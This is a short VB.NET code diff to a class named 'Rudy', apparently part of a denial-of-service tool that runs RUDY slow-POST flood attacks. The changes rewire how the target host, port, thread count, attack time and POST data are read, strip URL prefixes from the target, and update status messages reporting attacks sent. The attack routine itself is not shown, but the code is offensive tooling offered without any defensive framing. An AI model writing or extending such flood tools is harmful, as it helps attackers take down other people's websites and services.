@@ -17,18 +17,19 @@ Public Class Rudy
     Public Sub New(ByVal model As RudyModel)
         If Not AttackRunning = True Then
             AttackRunning = True
-            HostToAttack = model.Host
-            Ports = model.Port
-            ThreadstoUse = model.ThreadstoUse
-            TimetoAttack = model.Time
-            PostDATA = model.PostDATA
+            HostToAttack = model.newBaseFloodModel.Host
+            Ports = model.newRudyVariables.Port
+            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
+            TimetoAttack = model.newBaseFloodModel.Time
+            PostDATA = model.newRudyVariables.PostDATA
             If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
             If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
             If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)
 
 
             Threads = New Thread(ThreadstoUse - 1) {}
-            GetFloodsBase().SetMessage("RUDY attack")
+            GetFloodsBase().Reset()
+            GetFloodsBase().SetMessage("RUDY attack started")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -51,7 +52,7 @@ Public Class Rudy
             AttackRunning = False
             GetFloodsBase().SetMessage("Rudy Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
-
+            GetFloodsBase().SetEnd()
         End If
 
     End Sub
